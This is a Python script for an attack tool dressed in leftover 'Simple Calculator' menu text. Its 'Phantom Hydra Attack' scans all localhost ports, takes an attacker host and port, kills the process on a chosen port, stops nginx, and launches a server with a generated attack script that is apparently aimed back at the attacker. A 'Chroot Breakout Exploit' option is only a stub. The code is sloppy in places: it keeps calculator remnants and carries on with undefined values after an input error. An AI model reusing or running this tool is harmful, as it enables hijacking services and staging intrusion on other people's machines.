
import socket
from process_manager import ProcessManager
from custom_server import CustomServer 



def _scan_localhost_ports(start_port=1, end_port=65535):
    print("Scanning localhost for open ports...")
    open_ports = []
    for port in range(start_port, end_port + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.1)  # Small timeout for quick scanning
            result = s.connect_ex(("127.0.0.1", port))
            if result == 0:
                open_ports.append(port)
                print(f"Port {port} is open")

    return open_ports


def phantomHydraAttack(port_start, port_end, attack_host, attack_port):
    _scan_localhost_ports(port_start, port_end)
    port = int(input("Enter Open Port on which you want to continue: "))
    custom_server = CustomServer(port=port)
    custom_server.generate_script_for_attack(host=attack_host,port=attack_port)
    processManager = ProcessManager(port=port)
    processManager.kill_process_on_port()
    if (processManager.is_nginx_running()):
        processManager.stop_nginx()
    custom_server.start_server()


def chrootBreakOutExploit():
    print("I am in")


def main():
    while True:
        print("\nSimple Calculator")
        print("1. Phantom Hydra Attack 🐍👻")
        print("2. Chroot Breakout Exploit 🏴‍☠️🔓")
        print("0. Exit")

        choice = input("Select an operation (1-5): ")

        if choice == '0':
            print("Exiting calculator. Goodbye!")
            break

        if choice not in ['1', '2', '3', '4']:
            print("Invalid choice. Please select a valid option.")
            continue
        if choice == '1':
            try:
                attack_host = input("Enter Attacker's host: ")
                attack_port = input("Enter Attacker's port:")
                print("\nEnter the range of port you want to scan")
                port_1 = int(input("Enter Starting Port: "))
                port_2 = int(input("Enter Ending Port:"))
            except ValueError:
                print("Invalid input. Please enter numeric values.")
            phantomHydraAttack(port_1, port_2, attack_host, attack_port)

        elif choice == '2':
            chrootBreakOutExploit()


if __name__ == "__main__":
    main()
